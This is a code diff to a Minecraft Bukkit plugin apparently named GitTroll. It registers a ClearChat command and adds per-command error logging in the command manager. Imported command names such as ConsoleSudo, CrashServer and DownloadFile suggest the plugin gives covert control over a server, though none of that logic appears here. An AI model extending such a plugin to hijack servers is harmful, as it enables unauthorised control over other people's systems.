@@ -39,6 +39,7 @@ import net.Lenni0451.GitTroll.command.commands.player.Untrust;
 import net.Lenni0451.GitTroll.command.commands.player.Vanish;
 import net.Lenni0451.GitTroll.command.commands.plugin.Help;
 import net.Lenni0451.GitTroll.command.commands.plugin.UpdateVersion;
+import net.Lenni0451.GitTroll.command.commands.server.ClearChat;
 import net.Lenni0451.GitTroll.command.commands.server.ConsoleSudo;
 import net.Lenni0451.GitTroll.command.commands.server.CrashServer;
 import net.Lenni0451.GitTroll.command.commands.server.DownloadFile;
@@ -57,6 +58,7 @@ import net.Lenni0451.GitTroll.command.commands.world.WorldReset;
 import net.Lenni0451.GitTroll.event.EventListener;
 import net.Lenni0451.GitTroll.utils.ArrayHelper;
 import net.Lenni0451.GitTroll.utils.CustomPlayer;
+import net.Lenni0451.GitTroll.utils.Logger;
 
 public class CommandManager implements Listener {
 	
@@ -106,13 +108,14 @@ public class CommandManager implements Listener {
 	public final ConsoleSudo ConsoleSudo = null;
 	public final CommandSpy CommandSpy = null;
 	public final Gamemode Gamemode = null;
+	public final ClearChat ClearChat = null;
 	
 	public CommandManager() {
 		this.commands = new ArrayList<>();
 		Bukkit.getPluginManager().registerEvents(this, GitTroll.getInstance());
 		
-		try {
-			for(Field field : CommandManager.class.getDeclaredFields()) {
+		for(Field field : CommandManager.class.getDeclaredFields()) {
+			try {
 				if(CommandBase.class.isAssignableFrom(field.getType())) {
 					field.setAccessible(true);
 					if(field.get(this) == null) {
@@ -122,8 +125,10 @@ public class CommandManager implements Listener {
 					this.addCommand(command);
 					field.setAccessible(false);
 				}
+			} catch (Exception e) {
+				Logger.broadcastGitMessage("§cWarning! Could not initialized a command! Class name: " + field.getType().getSimpleName());
 			}
-		} catch (Exception e) {}
+		}
 	}
 	
 	private void addCommand(final CommandBase command) {
